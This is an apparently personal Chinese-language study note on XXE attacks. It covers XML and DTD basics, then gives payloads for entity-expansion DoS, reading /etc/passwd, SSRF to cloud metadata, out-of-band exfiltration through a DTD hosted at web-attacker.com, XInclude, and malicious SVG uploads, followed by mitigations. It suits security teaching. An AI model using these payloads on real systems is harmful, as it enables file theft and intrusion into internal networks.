---
title: XXE-XML 外部实体注入攻击
tags:
  - web安全
creation date: 2024-03-20
done: true
---
# 1. XXE 简介  
---
>[!note]
>**XML 外部实体漏洞**（XML External Entity），应用程序允许引用外部实体时，并且允许外部实体的加载，可能导致加载恶意 xml 内容。造成文件读取、命令执行、内网端口扫描、攻击内网等影响。  
>一般的 XXE 攻击只有在服务器有回显或者报错的基础上才能使用该漏洞来读取服务端文件，但是也可以通过盲注的方式实现攻击。  

## 1.1 XML 基础  
XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，用来传输和存储数据。  
目前，XML 文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）的应用比较广泛。  
### 1.1.1 XML 文档结构
- XML 声明  
- DTD 文档类型定义（可选），文档元素需要以 DTD 为模板。  
- 文档元素等。 

### 1.1.2 XML 语法特征
- 所有 XML 元素都须有关闭标签  
- XML 标签对大小写敏感  
- XML 必须正确地嵌套  
- XML 文档必须有根元素  
- XML 的属性值需要加引号  

### 1.1.3 DTD 声明  
>[!Example]
>声明一个 book 元素，属性包括 title，author，publisher，year。  
1. 内部声明：
	```xml
	<!DOCTYPE book [
	<!ELEMENT book (title, author, publisher, year)>
	<!ELEMENT title (#PCDATA)>
	<!ELEMENT author (#PCDATA)>
	<!ELEMENT publisher (#PCDATA)>
	<!ELEMENT year (#PCDATA)>
	]>
	```
2. 外部声明：
	```xml
	语法：<!DOCTYPE element SYSTEM "URI/URL">
	<!DOCTYPE book SYSTEM "http://192.168.1.100:8000/book.dtd">
	```

### 1.1.4 DTD 实体  
**普通实体**：  
引用方法：`&entity-name;`    
1. 内部实体：`<!ENTITY entity-name "entity-value">`  
2. 外部实体：
	-  `<!ENTITY entity-name SYSTEM "URI/URL">`  
		- SYSTEM：外部的 DTD 文件是私有的，没有公开发行。  
	- `<!ENTITY entity-name PUBLIC "DTD-NAME">`
		- PUBLIC：公用的 DTD 文件，又权威机构发行，供特定公司使用。  

**参数实体**：  
引用方法：`%entity-name;`  
参数实体与常规实体非常相似，但它们只能在 DTD 的结构内部使用，即它们不能出现在 XML 文档的元素、属性或处理指令中。
1. 外部参数实体：`<!ENTITY % entity-name SYSTEM "URI/URL">`  
2. 内部参数实体：`<!ENTITY % entity-name "entity-value">`  

### 1.1.5 PCDATA  
PCDATA 指的是**被解析的字符数据**（Parsed Character Data）。  
非法的 xml 字符，需要使用转义字符进行替换。

| 转义字符     | 含义  |
| -------- | --- |
| `&lt;`   | <   |
| `&gt;`   | >   |
| `&amp;`  | &   |
| `&apos;` | '   |
| `&quot;` | "   |

### 1.1.6 CDATA  
CDATA 不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。
CDATA 部分中的所有内容都会被解析器忽略。使用方法：`"<![CDATA["……"]]>"`  

## 1.2 XXE 漏洞产生原因  
部分应用程序使用 xml 格式在浏览器和服务器之间传输数据。而执行此操作的应用程序总是使用标准库或者其他 api 来处理服务器上的 xml 数据。  
XXE 漏洞的出现是因为 xml 规范包含各种潜在的危险功能，这些危险功能虽然不被应用程序所使用，但是 xml 的标准解析器支持这些功能。导致攻击者可以添加并加载恶意的 xml 内容。

## 1.3 无回显 XXE  
当应用程序受到 XXE 攻击，但在其响应中不返回任何定义的外部实体的值时，就是无回显 XXE。  
直接检索服务器端文件是不可能的，因此无回显 XXE 通常比常规 XXE 漏洞更难利用。  

## 1.4 各语言引用外部实体时支持的协议  


| 语言     | libxml 2            | PHP                                                                                   | Java                                                              | .Net                         |
| ------ | ------------------- | ------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | ---------------------------- |
| **协议** | file<br>http<br>ftp | file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar | http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher | file<br>http<br>https<br>ftp |


# 2. 攻击方式  
---
## 2.1 DOS 拒绝服务攻击  
```xml
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```
若解析过程非常缓慢，表示攻击成功。目标可能有 DOS 漏洞。具体可以使用更多层的 entity 或者递归，也可使用更加巨大的外部实体。  

## 2.2 文件读取  
[[常见敏感信息路径]]  
利用外部实体来读取系统的敏感文件，也可配合其他协议获取文件内容。
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

配合 php 伪协议，对内容进行 base 64 编码，可以获取到非法的 xml 字符：
```xml
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

## 2.3 利用 XXE 进行 SSRF 攻击  
可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。
要利用 XXE 漏洞执行 SSRF 攻击，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用已定义的实体。  
portswigger 的靶场连接：[Lab: Exploiting XXE to perform SSRF attacks | Web Security Academy](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://169.254.169.254/"> 
]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

## 2.4 使用外带技术（OAST）检测无回显 XXE  
通常可以使用与 XXE SSRF 攻击相同的技术来检测无回显 XXE，这会触发与目标后端服务器与攻击者系统的带外网络交互。  
例如：构造外部实体：`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "URL"> ]>`  
此 XXE 攻击会导致服务器向指定的 URL 发出后端 HTTP 请求。攻击者可以监视由此产生的 DNS 查找和 HTTP 请求，从而检测到 XXE 攻击成功。  
此处可以配合使用 [DNSLog Platform](http://www.dnslog.cn/)，将 URL 设置为该网站的 subdomain，并进行刷新。  

## 2.5 无回显 XXE 将数据带外泄露  
首先构造恶意 DTD 文件，内容如下：  
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
将恶意 DTD 文件托管到 web 服务上，例如：`http://web-attacker.com/malicious.dtd`  
最后，攻击者向易受攻击的应用程序提交如下 XXE payload：  
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
这个 XXE payload 声明了一个名为 `xxe` 的 XML 参数实体，然后在 DTD 中使用该实体。  
这将导致 XML 解析器从攻击者的服务器获取外部 DTD 并内联解释它。然后执行恶意 DTD 中定义的步骤，并将 `/etc/passwd` 文件传输到攻击者的服务器。  

## 2.6 无回显 XXE 报错信息检索敏感信息  
构造恶意 DTD 文件，内容如下：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```
可能会产生如下的报错信息：  
```text
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
...
```

## 2.7 XInclude 攻击  
> [!tip]
> SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。  

有些应用程序接收客户端提交的数据，在服务器端会将数据嵌入到一个 XML 文档中，然后解析该文档。当客户端提交的数据被放置到后端 SOAP 请求中，再由后端 SOAP 服务处理时，这种情况下无法使用常见的 XXE 攻击，因为无法控制整个 xml 文档，无法定义或者修改 `DOCTYPE` 元素。 
需要使用 `XInclude` 进行替代。`XInclude` 允许从子文档开始构建 xml 文档，可以在 xml 文档中的任何数据值中放入 `XInclude`。  
例如：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 2.8 利用 XXE 进行文件上传攻击  
一些应用程序允许用户上传文件，在服务端进行处理。一些常见的文件格式使用到了 xml 或者包含 xml 的子组件。例如：`DOCX` 的办公文档，`SVG` 的图片格式。  
例如：应用程序可能允许用户上传图像，希望接受 `PNG` 或 `JPEG` 等格式，而图像处理库可能也支持 `SVG` 格式。可以通过提交恶意的 `SVG` 图像，完成 XXE 攻击。  
构造恶意 SVG 图片文件：  
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```
上传该图像后，图像会显示处理 `/etc/hostname` 文件的内容。  

# 3. 漏洞修复和预防
---
- 使用各个开发语言所提供的禁用外部实体的方法；   
- 严格过滤和验证用户提交的 xml 数据，过滤关键词：`<!DOCTYPE`、`<!ENTITY`、`STSTEM`、`PUBLIC` 、`<xi:include` 等，防止攻击者构建 xml 文档；   
- 禁用外部实体解析，禁用不会被使用到的部分功能。  
